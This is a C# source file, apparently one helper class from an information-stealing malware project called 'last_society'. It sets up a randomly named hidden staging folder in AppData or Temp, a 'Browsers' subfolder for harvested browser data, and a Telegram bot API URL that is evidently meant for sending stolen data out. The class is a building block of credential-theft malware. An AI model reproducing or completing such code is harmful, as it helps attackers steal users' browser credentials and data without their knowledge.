using last_society;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Xml;

namespace last_society
{
    public class Help
    {

        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Help.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Help.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile

        

        // Выбираем рандомную системную папку
        public static string[] SysPatch = new string[]
        {
                LocalData, AppDate, Path.GetTempPath()
        };
        public static string RandomSysPatch = SysPatch[new Random().Next(0, SysPatch.Length)];

        public static string Mut = HWID;
        public static string HWID = "lastsociety";
        public static string ApiUrl = "https://api.telegram.org/bot";
        public static string dir = RandomSysPatch + "\\" + GenString.Generate() + HWID + GenString.GeneNumbersTo();
        public static string last_society = dir + "\\" + GenString.GeneNumbersTo() + HWID + GenString.Generate();
        public static string Browsers = last_society + "\\Browsers";



    }


}